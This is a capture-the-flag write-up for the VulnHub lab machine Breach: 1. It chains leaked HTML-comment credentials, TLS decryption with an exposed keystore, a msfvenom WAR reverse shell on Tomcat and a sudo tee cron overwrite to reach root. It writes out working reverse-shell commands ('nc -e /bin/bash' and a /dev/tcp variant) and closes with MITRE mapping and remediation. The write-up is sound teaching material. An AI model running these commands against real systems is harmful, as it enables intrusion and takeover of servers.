# Breach: 1 — Writeup

> *That moment when the IDS makes every port look "open" so nmap is basically useless, the real creds are double-Base64'd inside an HTML comment like the devs thought nobody reads source code, and Tomcat is just sitting there on 8443 begging for a WAR file. Legit one of the most creative beginner chains on VulnHub, fr fr. Shoutout to [@mrb3n813](https://twitter.com/mrb3n813) for building this layered gem.*

---

## Machine Metadata

| Field | Value |
|---|---|
| **Level** | Beginner-Intermediate |
| **Target VM** | Breach: 1 |
| **Attacker VM** | Kali Linux 2024.x (192.168.110.128) |
| **VulnHub URL** | https://www.vulnhub.com/entry/breach-1,152/ |
| **Techniques** | HTML-comment credential leakage, double Base64 encoding, SSL/TLS traffic decryption via JKS keystore, Apache Tomcat WAR reverse shell, image metadata credential exfiltration, sudo tee cron script overwrite |
| **CVEs** | None (pure misconfiguration chain) |
| **APT Relevance** | FIN7 and APT41 routinely exploit misconfigured Java web servers for initial access; cron-based persistence and sudo abuse are documented in Lazarus Group Linux implants |

---

## Attack Summary

```
[Attacker: 192.168.110.128]
          |
          v
  nmap -Pn 192.168.110.140
  (IDS floods scan: all ports appear open)
          |
          v
  HTTP:80 --- view-source: HTML comment
  double Base64 decode --> user:password (employee portal)
          |
          v
  Employee Portal --> inbox msg #3
  --> download: breach.pcap + tomcat.keystore (JKS)
          |
          v
  keytool: JKS --> PKCS12
  Wireshark SSL decrypt (port 8443)
  --> Tomcat manager creds + upload endpoint URL
          |
          v
  msfvenom WAR (java/jsp_shell_reverse_tcp)
  --> upload via Tomcat manager
  --> browse /update --> Meterpreter (www-data)
          |
          v
  /home/milton/bill.png
  exiftool --> Comment: coffeestains
          |
          v
  su blumbergh (password: coffeestains)
  sudo -l --> NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh
          |
          v
  echo "nc -e /bin/bash 192.168.110.128 8443" | sudo tee tidyup.sh
  nc -lvv -p 8443 (wait <= 3 min for cron)
          |
          v
        [ROOT]
```

---

## Methodology

1. Network discovery and initial port scan (with IDS noise awareness)
2. Manual HTTP enumeration: page source analysis for hidden credential blobs
3. Employee portal login, inbox message analysis, artifact download (pcap + keystore)
4. JKS-to-PKCS12 conversion and Wireshark SSL stream decryption
5. Malicious WAR file generation and Tomcat manager upload for initial shell
6. Filesystem enumeration: image metadata analysis via exiftool for lateral credentials
7. User switch to `blumbergh`, sudo rights enumeration, cron-based root escalation via `tee`

---

## Steps

### Step 1: Network Discovery

**Context:** The target runs an active IDS that responds to port scans by marking most ports as "open," making automated service fingerprinting unreliable. Manual HTTP enumeration on port 80 is the reliable starting point.

```bash
sudo netdiscover -i eth1 -r 192.168.110.0/24
nmap -Pn 192.168.110.140
```

**Expected output:**
```
Host discovery disabled (-Pn). All addresses will be marked 'up'.
Nmap scan report for 192.168.110.140
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
...
(most ports appear open due to IDS)
```

**Alternatives:** `arp-scan -l` for cleaner host discovery without triggering IDS; `masscan` with low rate.

**Real-world note:** Production IDS/IPS products (Snort, Suricata, Palo Alto) commonly respond to aggressive scans with RST floods. Pentesters use decoy scans (`nmap -D`) or slow-rate scans (`--scan-delay`) to reduce noise and improve accuracy.

**MITRE TTP:** T1595.001 - Active Scanning: Scanning IP Blocks

---

### Step 2: Web Enumeration: Hidden Credentials in HTML Comment

**Context:** Browsing to `http://192.168.110.140` reveals a corporate-style homepage. View the page source carefully: developers left a credential blob inside an HTML comment, encoded twice in Base64.

```bash
# In browser: Ctrl+U to view source
# Look for: <!-- ... -->
# Extract the Base64 string, decode twice:
echo "BASE64_STRING_HERE" | base64 -d | base64 -d
```

**Expected output:**
```
username:password
```

**Alternatives:** Use HackBar Firefox extension for rapid decode. `curl http://192.168.110.140 | grep -i base64` or `curl ... | grep "<!--"`.

**Real-world note:** Credentials in HTML comments are a OWASP Top 10 A02:2021 (Cryptographic Failures / Sensitive Data Exposure) finding. Static analysis tools like Semgrep or truffleHog catch these in pre-commit hooks.

**MITRE TTP:** T1552.001 - Unsecured Credentials: Credentials In Files

---

### Step 3: Employee Portal, SSL Capture, and JKS Keystore

**Context:** Log in to the employee portal with decoded credentials. The inbox contains three messages; message 3 includes a link to a `.pcap` file (SSL traffic capture) and a downloadable `tomcat.keystore` (Java KeyStore, JKS format).

```bash
# Download the keystore and pcap from the portal links
# Convert JKS to PKCS12 (Wireshark can use PKCS12 for SSL decryption):
keytool -importkeystore \
  -srckeystore tomcat.keystore \
  -destkeystore mykeystore.p12 \
  -deststoretype PKCS12 \
  -srcalias tomcat
# Password prompt: tomcat
```

**Open Wireshark, configure SSL decryption:**
```
Edit --> Preferences --> Protocols --> TLS --> Edit RSA Keys list
IP: 192.168.110.140 | Port: 8443 | Protocol: http | Key file: mykeystore.p12 | Password: tomcat
```

Follow the decrypted SSL stream. Decode any Base64 blobs found in the cleartext HTTP traffic.

**Expected output (after decode):**
```
Tomcat manager credentials: tomcat:XXXXXXXX
File upload endpoint: http://192.168.110.140:8443/manager/html
```

**Real-world note:** JKS keystores exposed via web-accessible paths allow complete retrospective decryption of recorded TLS sessions. PCI-DSS Requirement 4 and NIST SP 800-52 mandate TLS key material be stored outside the web root and rotated regularly.

**MITRE TTP:** T1552.004 - Unsecured Credentials: Private Keys

---

### Step 4: WAR Reverse Shell via Tomcat Manager

**Context:** With Tomcat manager credentials and the upload endpoint URL, deploy a malicious WAR file to get a shell as the Tomcat service account.

```bash
# Generate WAR reverse shell:
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.110.128 LPORT=4444 \
  -f war -o update.war
```

**Start Metasploit handler:**
```
msfconsole -q
use exploit/multi/handler
set payload java/meterpreter/reverse_tcp
set LHOST 192.168.110.128
set LPORT 4444
run
```

**Upload and trigger:**
```bash
# Upload update.war via Tomcat Manager web UI at /manager/html
# Then browse to http://192.168.110.140:8443/update/
```

**Upgrade to full TTY:**
```bash
python -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
# Ctrl+Z, then: stty raw -echo; fg
```

**Expected output:**
```
[*] Meterpreter session 1 opened
meterpreter> getuid
Server username: www-data
```

**Alternatives:** `curl` or `python requests` to upload the WAR without the browser UI. `weevely` for a PHP webshell alternative if PHP is present.

**Real-world note:** Apache Tomcat manager with default or weak credentials is a recurring critical finding in enterprise Java environments. It is commonly exploited by ransomware operators (FIN7, Conti affiliates) to deploy malicious WARs for persistent access.

**MITRE TTP:** T1505.003 - Server Software Component: Web Shell | T1190 - Exploit Public-Facing Application

---

### Step 5: Lateral Movement via exiftool Image Metadata

**Context:** As `www-data`, enumerate `/home` directories for interesting files. A PNG in `/home/milton/` contains a password stored in the image EXIF comment field.

```bash
cd /home/milton
ls -la
exiftool bill.png
```

**Expected output:**
```
ExifTool Version Number         : 10.xx
...
Comment                         : coffeestains
```

**Switch user:**
```bash
cat /etc/passwd | grep -v nologin | grep -v false
su blumbergh
# Password: coffeestains
id
# uid=1001(blumbergh) gid=1001(blumbergh) groups=1001(blumbergh)
```

**Alternatives:** `strings bill.png | grep -i pass`, `binwalk -e bill.png` for steganographic data.

**Real-world note:** Camera apps, design tools, and custom scripts routinely write metadata into images. Security teams use `exiftool -all= file.jpg` to strip metadata before publishing. GDPR Article 5(1)(c) data minimisation applies.

**MITRE TTP:** T1552.001 - Unsecured Credentials: Credentials In Files | T1078.003 - Valid Accounts: Local Accounts

---

### Step 6: Privilege Escalation: sudo tee Cron Script Overwrite

**Context:** `blumbergh` can run `tee` as root via sudo, targeting a specific cron script. This lets us overwrite the script with arbitrary content, which root's cron job will execute.

```bash
sudo -l
# User blumbergh may run the following commands:
# (root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh

ls -la /usr/share/cleanup/tidyup.sh
# -rwxr-xr-x 1 root root ... /usr/share/cleanup/tidyup.sh

# Check cron timing:
cat /etc/crontab
# */3 * * * * root /usr/share/cleanup/tidyup.sh
```

**Overwrite the script and set up listener:**
```bash
# On attacker:
nc -lvv -p 8443

# On target:
echo "nc -e /bin/bash 192.168.110.128 8443" | sudo tee /usr/share/cleanup/tidyup.sh
# Wait up to 3 minutes for cron to fire
```

**Expected output (on attacker nc listener):**
```
Connection from 192.168.110.140:XXXXX
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/proof.txt
```

**Alternatives:** Use `bash -i >& /dev/tcp/192.168.110.128/8443 0>&1` in place of nc for systems without nc `-e` support.

**Real-world note:** Unrestricted `sudo tee` to any writable path is functionally equivalent to arbitrary file write as root. GTFOBins documents 60+ binaries with similar misuse potential. The fix is a granular sudoers entry restricted to safe paths and arguments.

**MITRE TTP:** T1053.005 - Scheduled Task/Job: Cron | T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching

---

## Captured Flags, Hashes, and Credentials

| Type | Value | Where Found | Used For |
|---|---|---|---|
| Credential (Base64) | (decoded from HTML comment) | HTTP port 80 page source | Employee portal login |
| Credential | `tomcat:XXXXXXXX` | Wireshark SSL stream | Tomcat manager login |
| Credential | `blumbergh:coffeestains` | bill.png EXIF Comment | Lateral movement |
| Root Shell | `uid=0(root)` | cron callback | Full compromise |

---

## Lessons Learned

| Finding | Real-World Relevance |
|---|---|
| Credentials stored in HTML comments (Base64 encoded) | Encoding is not encryption. Automated secrets scanners (truffleHog, gitleaks) catch these in code and web content. |
| JKS keystore exposed via web-accessible path | TLS private keys reachable over HTTP enable full session decryption of archived traffic. Store keys in HSMs or secrets managers (Vault, AWS KMS). |
| Wireshark SSL decryption via PKCS12 | Blue teams can decrypt TLS internally for incident response with proper key escrow. Attackers do it too when keys are exposed. |
| Image EXIF metadata as credential store | Developers sometimes use image comments for "hidden" config. Strip metadata before publishing with `exiftool -all=`. |
| sudo tee to a root-owned cron script | Unrestricted file write as root is root. GTFOBins catalogues this pattern. Audit sudoers with least-privilege in mind. |
| IDS response creating scan noise | Active IDS fingerprinting can slow or mislead attackers, but defenders should not rely on it as a primary control. |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning: Scanning IP Blocks | T1595.001 |
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 |
| Credential Access | Unsecured Credentials: Private Keys | T1552.004 |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Server Software Component: Web Shell | T1505.003 |
| Discovery | File and Directory Discovery | T1083 |
| Discovery | System Owner/User Discovery | T1033 |
| Lateral Movement | Valid Accounts: Local Accounts | T1078.003 |
| Privilege Escalation | Scheduled Task/Job: Cron | T1053.005 |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 |

---

## Remediation

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | ID.AM-2 | Inventory all web-accessible directories; mark paths containing key material |
| Protect | PR.AC-4 | Apply least-privilege to all service accounts and sudo rules |
| Protect | PR.DS-1 | Encrypt credentials at rest; never embed in source code or markup |
| Detect | DE.CM-3 | Monitor for unusual file writes to `/etc/cron*` and `/usr/share/` paths |
| Respond | RS.AN-3 | Investigate cron modifications as potential persistence indicators |

### NIST SP 800-53 Controls

| Control | Requirement | Applicability |
|---|---|---|
| IA-5 | Authenticator Management | Rotate and protect TLS private keys; do not expose keystores |
| AC-6 | Least Privilege | Restrict sudo rules to specific commands with fixed arguments |
| CM-7 | Least Functionality | Disable Tomcat manager in production or restrict to localhost |
| AU-12 | Audit Record Generation | Log sudo usage, file writes to sensitive paths, cron changes |
| SI-3 | Malware Protection | Scan uploaded files; block WAR uploads from untrusted sources |

### CISA KEV Relevance

No direct CVEs. However, Apache Tomcat manager abuse (similar to CVE-2017-12617, CVE-2019-0232) has KEV entries. Misconfigured Tomcat managers are a recurring target for ransomware precursor activity.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domain | Practice | Gap |
|---|---|---|
| ACM (Asset, Change, Configuration) | ACM-1c | Key material stored in web root = MIL0 |
| IAM (Identity and Access Management) | IAM-2b | Default Tomcat credentials = MIL0 |
| IR (Incident Response) | IR-1c | No detection for cron modifications = MIL0 |

### MITRE D3FEND Countermeasures

| D3FEND Technique | ID | Defends Against |
|---|---|---|
| File Content Rules | D3-FCR | WAR upload detection |
| User Behavior Analysis | D3-UBA | Anomalous `su` and `tee` usage |
| Credential Hardening | D3-CH | Keystore exposure, Base64 creds |
| Process Spawn Analysis | D3-PSA | Reverse shell via cron |

---

## Final Thoughts

Breach: 1 is a full-stack misconfiguration chain that mirrors real enterprise Java environments more than most CTF boxes. The IDS red herring, the layered Base64, the SSL decryption workflow, and the creative `sudo tee` escalation make it genuinely educational. If you can work through this box cleanly and explain each step, you can articulate half of a Tomcat-focused pentest engagement. Noice chain, 10/10 would WAR again.

Thanks guys!! (❍ᴥ❍ʋ)
